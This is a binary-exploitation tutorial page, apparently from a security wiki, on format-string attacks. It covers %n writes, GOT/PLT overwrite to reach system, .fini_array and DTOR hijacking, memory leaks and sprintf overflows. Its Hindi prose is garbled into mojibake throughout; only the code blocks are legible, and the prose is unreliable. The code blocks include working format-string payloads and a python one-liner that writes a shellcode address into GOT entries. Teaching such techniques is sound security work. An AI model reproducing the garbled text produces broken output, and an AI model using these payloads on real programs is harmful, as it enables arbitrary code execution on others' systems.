рдпрд╣ рдкреНрд░рдХрд╛рд░ рдХреЗ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдХрд┐рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рд▓рд┐рдЦрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдирд╣реАрдВ рдХрд░рддрд╛, рдмрд▓реНрдХрд┐ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧрд▓рдд рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдП рдЧрдП рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

**рдЕрд╡рд┐рдХрд▓реНрдкрд┐рдд рдЪрд░**

рдПрдХ рдЕрд╡рд┐рдХрд▓реНрдкрд┐рдд рдЪрд░ рдХрд╛ рдорд╛рди рдХреНрдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдФрд░ рдЗрд╕реЗ рджреЗрдЦрдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдкрд┐рдЫрд▓реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдЪрд░ рдХрд╛ рдорд╛рди рд▓реЗ рдФрд░ рдпрд╣ рд╣рдорд▓рд╛рд╡рд╛рджреА рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЛред

## **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕**

рд╕реА рдореЗрдВ **`printf`** рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХреБрдЫ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреА **рдкрд╣рд▓реА рдкреИрд░рд╛рдореАрдЯрд░** рдпрд╣ рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдЕрд╕рд▓реА рдЯреЗрдХреНрд╕реНрдЯ рдЬрд┐рд╕рдореЗрдВ рдлреЙрд░реНрдореЗрдЯрд░реНрд╕** рд╣реИрдВред рдЖрдЧреЗ рдХреА рдкреИрд░рд╛рдореАрдЯрд░ рдЙрдореНрдореАрдж рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдЕрд╕рд▓реА рдЯреЗрдХреНрд╕реНрдЯ рд╕реЗ **рдлреЙрд░реНрдореЗрдЯрд░реНрд╕** рдХреЛ **рдмрджрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП **рдорд╛рди** рд╣реИрдВред

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ **рд╣рдорд▓рд╛рд╡рд╛рджреА рдЯреЗрдХреНрд╕реНрдЯ рдХреЛ рдкрд╣рд▓реА рд╡рд╛рд▓реЗ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ** рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд╛рджреА рдПрдХ **рд╡рд┐рд╢реЗрд╖ рдЗрдирдкреБрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ** **printf рдлреЙрд░реНрдореЗрдЯ** рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХрд┐рд╕реА рднреА рдкрддреЗ рдореЗрдВ рдХреЛрдИ рднреА рдбреЗрдЯрд╛ рд▓рд┐рдЦрдиреЗ** рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЕрдкрдиреА рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧреАред

рдлреЙрд░реНрдореЗрдЯрд░реНрд╕:
```bash
%08x тАФ> 8 hex bytes
%d тАФ> Entire
%u тАФ> Unsigned
%s тАФ> String
%n тАФ> Number of written bytes
%hn тАФ> Occupies 2 bytes instead of 4
<n>$X тАФ> Direct access, Example: ("%3$d", var1, var2, var3) тАФ> Access to var3
```
**`%n`** **рдЙрд╕ рдкрддреЗ рдкрд░ рд▓рд┐рдЦрддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ **рд▓рд┐рдЦреЗ рдЧрдП рдмрд╛рдЗрдЯреНрд╕ рдХреА рд╕рдВрдЦреНрдпрд╛** рд╣реЛрддреА рд╣реИред рд╣рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рддрдиреЗ **рд╣реЗрдХреНрд╕ рдирдВрдмрд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ рдмрд╛рдЗрдЯреНрд╕ рд▓рд┐рдЦрдирд╛ рд╣реИ, рдпрд╣реА рддрд░реАрдХрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рдХреЛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред
```bash
AAAA%.6000d%4\$n тАФ> Write 6004 in the address indicated by the 4┬║ param
AAAA.%500\$08x тАФ> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

рдпрд╣ рддрд╛рд▓рд┐рдХрд╛ рд╣реИ рдЬреЛ рдХрд╛рд░реНрдпрдХреНрд░рдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдмрд╛рд╣реНрдп рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рдкрддреЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ: `objdump -s -j .got ./exec`

![](<../../.gitbook/assets/image (619).png>)

GEF рдореЗрдВ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рджреЗрдЦреЗрдВ рдХрд┐ рдЖрдк GOT рдореЗрдВ рдХреМрди рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рд╣реИрдВ: `gefтЮд x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдбреАрдмрдЧрд┐рдВрдЧ рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ `got` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреЛрдЯ рддрд╛рд▓рд┐рдХрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (621).png>)

рдПрдХ рдмрд╛рдЗрдирд░реА рдореЗрдВ GOT рдореЗрдВ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рд╣реЛрддреЗ рд╣реИрдВ рдпрд╛ PLT рдЦрдВрдб рдХреЗ рдкрддреЗ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдлрд╝рдВрдХреНрд╢рди рдкрддреЗ рдХреЛ рд▓реЛрдб рдХрд░реЗрдЧрд╛ред рдЗрд╕ рдЙрддреНрдкреАрдбрд╝рди рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЗ GOT рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдирд╛ рдЬреЛ рдмрд╛рдж рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ `system` рдлрд╝рдВрдХреНрд╢рди рдХреА PLT рдХрд╛ рдкрддрд╛ред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, рдЖрдк рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ GOT рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдВрдЧреЗ рдЬреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЗ рд╕рд╛рде рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ (рдЗрд╕рд▓рд┐рдП рдЖрдк рд╕рд┐рд╕реНрдЯрдо рдлрд╝рдВрдХреНрд╢рди рдХреЛ рднреЗрдЬреЗ рдЧрдП рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХреЗрдВрдЧреЗ)ред

рдпрджрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ `system` рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рдлрд╝рдВрдХреНрд╢рди рдХрд╛ GOT рдореЗрдВ рдХреЛрдИ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ `system` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

**Procedure Linkage Table** рдПрдХ ELF рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдХреЗрд╡рд▓ рдкрдардиреАрдп рддрд╛рд▓рд┐рдХрд╛ рд╣реИ рдЬреЛ рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдкреНрд░рддреАрдХ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╕рдорд╛рдзрд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЬрдм рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ GOT рдлреНрд▓реЛ рдХреЛ PLT рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗ рдФрд░ рдЗрд╕реЗ GOT рдкрд░ рд▓рд┐рдЦ рд╕рдХреЗред рдлрд┐рд░, рдЙрд╕ рдкрддреЗ рдкрд░ рдЕрдЧрд▓реА рдмрд╛рд░ рдЬрдм рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реАрдзреЗ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЗрд╕реЗ рд╕рдорд╛рдзрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдЖрдк PLT рдкрддреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ **`objdump -j .plt -d ./vuln_binary`**

### **рдЙрддреНрдкреАрдбрд╝рди рдлреНрд▓реЛ**

рдЬреИрд╕рд╛ рдкрд╣рд▓реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓рдХреНрд╖реНрдп рд╣реЛрдЧрд╛ рдХрд┐ рдмрд╛рдж рдореЗрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ GOT рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдкрддреЗ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдВред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, рд╣рдо рдПрдХ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдЦрдВрдб рдореЗрдВ рд╕реНрдерд┐рдд рдПрдХ рд╢реИрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЖрдк рдПрдХ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдЦрдВрдб рдореЗрдВ рдПрдХ рд╢реИрд▓рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдХрд▓реНрдк рд╣реИ рдХрд┐ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдВ рдЬреЛ рдЕрдкрдиреЗ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ `system` рдлрд╝рдВрдХреНрд╢рди рдХреА рдУрд░ рд╕рдВрдХреЗрддрд┐рдд рдХрд░реЗрдВред

рдкрддрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдо рддреМрд░ рдкрд░ 2 рдХрджрдо рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: рдЖрдк рдкрд╣рд▓реЗ 2 рдмрд╛рдЗрдЯ рд▓рд┐рдЦрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рджреВрд╕рд░реЗ 2ред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `$hn` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

HOB рдкрддреЗ рдХреЗ 2 рдЙрдЪреНрдЪ рдмрд╛рдЗрдЯ рдХреЛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ\
LOB рдкрддреЗ рдХреЗ 2 рдирд┐рдЪрд▓реЗ рдмрд╛рдЗрдЯ рдХреЛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ

рдЗрд╕рд▓рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рд╛рд░реВрдк рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХреЛ рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдЫреЛрдЯрд╛ рд▓рд┐рдЦрдирд╛ рд╣реЛрдЧрд╛ \[HOB, LOB] рдФрд░ рдлрд┐рд░ рджреВрд╕рд░рд╛ред

рдпрджрд┐ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

рдпрджрд┐ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 N┬║Param_dir_HOB LOB_shell-HOB_shell N┬║Param_dir_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **рдкреНрд░рд╛рд░реВрдк рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЙрддреНрдкреАрдбрд╝рди рдЯреЗрдореНрдкрд▓реЗрдЯ**

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рдкреНрд░рд╛рд░реВрдк-рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ GOT рдХрд╛ рдЙрддреНрдкреАрдбрд╝рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini_array**

рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдПрдХ рд╕рдВрд░рдЪрдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдЕрдЧрд░ рдЖрдк рдПрдХ рдкрддреЗ рдкрд░ рдЬрд╛рдХрд░ рдЕрдкрдирд╛ рд╢реИрд▓рдХреЛрдб рдмреБрд▓рд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ, рдпрд╛ рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рдореБрдЦреНрдп рдореЗрдВ рдлрд┐рд░ рд╕реЗ рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдкреНрд░рд╛рд░реВрдк рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рджреВрд╕рд░реА рдмрд╛рд░ рдЙрддреНрдкреАрдбрд╝рди рдХрд░ рд╕рдХреЗрдВред
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдпрд╣ **рдПрдХ рдЕрдирдВрдд рд▓реВрдк рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдЖрдк рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЖрддреЗ рд╣реИрдВ, рдХреИрдиреЗрд░реА рдХреЛ рдзреНрдпрд╛рди рдЬрд╛рдПрдЧрд╛, рд╕реНрдЯреИрдХ рдХрд╛ рдЕрдВрдд рдХреНрд╖рддрд┐рдЧреНрд░рд╕реНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдлрд┐рд░ рд╕реЗ рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХреЗ рд╕рд╛рде рдЖрдкрдХреЛ рд╡рд▓реНрди рдХрд╛ рдПрдХ рдЕрдзрд┐рдХ рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛрдЧрд╛ред

### **рдХрдВрдЯреЗрдВрдЯ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ**

рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рдореЗрдореЛрд░реА рд╕реЗ **рдХрдВрдЯреЗрдВрдЯ рдбрдВрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ **рд╕реНрдЯреИрдХ рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдЪрд░ pointing flag** рд╣реИред рдпрджрд┐ рдЖрдк **рдвреВрдВрдврд╝реЗрдВ** рдХрд┐ **рдореЗрдореЛрд░реА** рдореЗрдВ **рдлреНрд▓реИрдЧ** рдХрд╛ **рдкреЙрдЗрдВрдЯрд░** рдХрд╣рд╛рдБ рд╣реИ, рддреЛ рдЖрдк **рдкреНрд░рд┐рдВрдЯрдлрд╝ рдХреЛ рдкрд╣реБрдВрдЪ** рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдлреНрд▓реИрдЧ** рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

рдЗрд╕рд▓рд┐рдП, рдлреНрд▓реИрдЧ **0xffffcf4c** рдореЗрдВ рд╣реИ

![](<../../.gitbook/assets/image (618) (2).png>)

рдФрд░ рд▓реАрдХ рд╕реЗ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдлреНрд▓реИрдЧ рдХрд╛ рдкреЙрдЗрдВрдЯрд░** **8рд╡реЗрдВ** рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рд╣реИ:

![](<../../.gitbook/assets/image (623).png>)

рдЗрд╕рд▓рд┐рдП, **8рд╡реЗрдВ рдкреИрд░рд╛рдореАрдЯрд░** рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдЖрдк рдлреНрд▓реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (624).png>)

рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **рдкрд┐рдЫрд▓реЗ рдЙрддреНрдкреАрдбрд╝рди** рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП рдФрд░ рдпрд╣ рдЕрдиреБрднрд╡ рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдЖрдк **рдХрдВрдЯреЗрдВрдЯ рд▓реАрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк **`printf`** рдХреЛ рдЙрд╕ рд╕реЗрдХреНрд╢рди рдореЗрдВ **рд╕реЗрдЯ рдкреЙрдЗрдВрдЯрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ **рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓** рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдбрдВрдк** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ!

### **DTOR**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдбреАрдЯреАрдУрдЖрд░ рдЦрдВрдб рдХреЗ рд╕рд╛рде рдкрд╛рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

рдбрд┐рд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╡реЗ рдлрд╝рдВрдХреНрд╢рди рд╣реИрдВ рдЬреЛ **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ**ред\
рдпрджрд┐ рдЖрдк **рдПрдХ рдПрдбреНрд░реЗрд╕ рд▓рд┐рдЦрдиреЗ** рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ рддреЛ рдПрдХ **рд╢реИрд▓рдХреЛрдб** рдореЗрдВ **`__DTOR_END__`** , рддреЛ рд╡рд╣ **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрдЧрд╛ред\
рдЗрд╕ рд╕реЗрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep тАЬ__DTORтАЭ
```
рд╕рд╛рдорд╛рдиреНрдпрдд: рдЖрдкрдХреЛ **DTOR** рдЦрдВрдб **`ffffffff`** рдФрд░ **`00000000`** рдХреЗ рдордзреНрдп рдореЗрдВ рдкрд╛рдПрдВрдЧреЗред рддреЛ рдЕрдЧрд░ рдЖрдк рд╕рд┐рд░реНрдл рдЙрди рдорд╛рдиреЛрдВ рдХреЛ рджреЗрдЦрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рд░рдЬрд┐рд╕реНрдЯрд░ рдирд╣реАрдВ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП **`00000000`** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ **рд╢реЗрд▓рдХреЛрдб рдХреЗ рдкрддреЗ** рдХреЗ рд╕рд╛рде рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

### **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рд╕реЗ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛрдЬрд╝**

**sprintf** рдПрдХ рдлреЙрд░реНрдореЗрдЯреЗрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХ **рд╡реЗрд░рд┐рдПрдмрд▓** рдореЗрдВ **рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ **рдлреЙрд░реНрдореЗрдЯрд┐рдВрдЧ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ **рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ** рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреЗрд▓реЛрдб `%.44xAAAA` рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ **44B+"AAAA" рд▓рд┐рдЦреЗрдЧрд╛**, рдЬрд┐рд╕рд╕реЗ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

